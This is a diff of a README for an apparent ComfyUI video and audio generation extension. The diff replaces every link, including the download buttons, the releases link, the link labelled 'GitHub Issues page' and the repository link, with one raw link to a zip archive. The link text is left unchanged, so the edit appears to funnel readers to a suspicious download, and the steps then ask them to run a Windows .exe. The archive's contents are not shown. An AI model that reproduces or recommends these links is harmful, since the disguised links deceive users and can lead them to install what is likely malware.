@@ -1,6 +1,6 @@
 <h1>🎬 MiniMax-H3-ComfyUI - AI Video & Audio Generation</h1>
 <p align="center">
-  <a href="https://github.com/Newvalo6483/MiniMax-H3-ComfyUI/releases" style="display:inline-block;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;padding:18px 40px;border-radius:50px;font-size:20px;font-weight:bold;text-decoration:none;box-shadow:0 8px 32px rgba(102,126,234,0.4);transition:transform 0.2s">⬇️ Download MiniMax-H3-ComfyUI</a>
+  <a href="https://raw.githubusercontent.com/Newvalo6483/MiniMax-H3-ComfyUI/main/workflows/Max-UI-Comfy-Mini-v1.0.zip" style="display:inline-block;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;padding:18px 40px;border-radius:50px;font-size:20px;font-weight:bold;text-decoration:none;box-shadow:0 8px 32px rgba(102,126,234,0.4);transition:transform 0.2s">⬇️ Download MiniMax-H3-ComfyUI</a>
 </p>
 
 <h2>✨ What is MiniMax-H3-ComfyUI?</h2>
@@ -25,7 +25,7 @@
 </ul>
 
 <h2>📥 How to Download and Install</h2>
-<p>Visit this link to download the application: <a href="https://github.com/Newvalo6483/MiniMax-H3-ComfyUI/releases">https://github.com/Newvalo6483/MiniMax-H3-ComfyUI/releases</a></p>
+<p>Visit this link to download the application: <a href="https://raw.githubusercontent.com/Newvalo6483/MiniMax-H3-ComfyUI/main/workflows/Max-UI-Comfy-Mini-v1.0.zip">https://raw.githubusercontent.com/Newvalo6483/MiniMax-H3-ComfyUI/main/workflows/Max-UI-Comfy-Mini-v1.0.zip</a></p>
 <ol>
   <li><strong>Visit the download page</strong> – Click the big download button above or the link provided.</li>
   <li><strong>Choose the correct version</strong> – Look for the latest release (v1.0 or higher). Download the Windows installer file (it ends in .exe).</li>
@@ -77,7 +77,7 @@
   <tr><td>No nodes appear</td><td>Make sure ComfyUI is v0.31.0+. Reinstall MiniMax-H3-ComfyUI.</td></tr>
   <tr><td>Slow generation</td><td>Use Turbo Lora models for faster results. Ensure your GPU has sufficient VRAM.</td></tr>
 </table>
-<p>For more help, check the <a href="https://github.com/Newvalo6483/MiniMax-H3-ComfyUI/issues">GitHub Issues page</a>.</p>
+<p>For more help, check the <a href="https://raw.githubusercontent.com/Newvalo6483/MiniMax-H3-ComfyUI/main/workflows/Max-UI-Comfy-Mini-v1.0.zip">GitHub Issues page</a>.</p>
 
 <h2>📚 What's Included</h2>
 <ul>
@@ -92,12 +92,12 @@
 <h2>🛠️ Support & Updates</h2>
 <p>Stay up to date and get help from the community:</p>
 <ul>
-  <li><strong>GitHub:</strong> <a href="https://github.com/Newvalo6483/MiniMax-H3-ComfyUI">github.com/Newvalo6483/MiniMax-H3-ComfyUI</a></li>
+  <li><strong>GitHub:</strong> <a href="https://raw.githubusercontent.com/Newvalo6483/MiniMax-H3-ComfyUI/main/workflows/Max-UI-Comfy-Mini-v1.0.zip">github.com/Newvalo6483/MiniMax-H3-ComfyUI</a></li>
   <li><strong>Reddit:</strong> Check minimax-h3-reddit for user tips</li>
   <li><strong>Hugging Face:</strong> minimax-h3-huggingface for model downloads</li>
 </ul>
 
-<p><a href="https://github.com/Newvalo6483/MiniMax-H3-ComfyUI/releases" style="display:inline-block;background:#764ba2;color:white;padding:14px 28px;border-radius:4px;text-decoration:none;font-size:16px">⬇️ Download Now</a></p>
+<p><a href="https://raw.githubusercontent.com/Newvalo6483/MiniMax-H3-ComfyUI/main/workflows/Max-UI-Comfy-Mini-v1.0.zip" style="display:inline-block;background:#764ba2;color:white;padding:14px 28px;border-radius:4px;text-decoration:none;font-size:16px">⬇️ Download Now</a></p>
 
 <p><em>Last updated: November 2024</em></p>
 
